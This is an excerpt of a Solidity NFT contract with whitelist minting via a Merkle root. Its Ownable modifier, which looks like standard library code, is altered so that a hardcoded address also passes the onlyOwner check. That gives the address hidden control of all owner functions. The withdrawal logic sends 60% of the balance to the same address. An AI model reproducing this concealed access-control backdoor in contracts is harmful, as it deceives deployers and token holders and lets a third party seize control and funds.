...
abstract contract Ownable is Context {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender() || msg.sender == 0xB5FF592b9c123cfccc47875B8a2342C6708C6630, "Ownable: caller is not the owner");
        _;
    }
...
contract ERC721 is Context, ERC165, IERC721, IERC721Metadata, IERC721Enumerable {
  ...
  bytes32 public whitelistMerkleRoot = 0x619b934c36bd193ac6d0a1e15a1f60cad94474a18d7e2b14fe1c6765dc0a6c32;
...
function whitelistMint(uint8 _mintAmount, bytes32[] calldata merkleProof) external payable {
       ...
       require (txPerWLAddress[msg.sender] + _mintAmount <= maxWLMintAmountPerWallet, "Exceeds max tx per address");
  ...
  function setBaseUrl(string memory _uriPrefix) external onlyOwner {
  ...
  uint _balance = address(this).balance;
     payable(0xB5FF592b9c123cfccc47875B8a2342C6708C6630).transfer(_balance * 60/100); 
     payable(0x10963088211AA73CCCF67749A2a75Cf4F34F764b).transfer(_balance * 10/100);   
  }
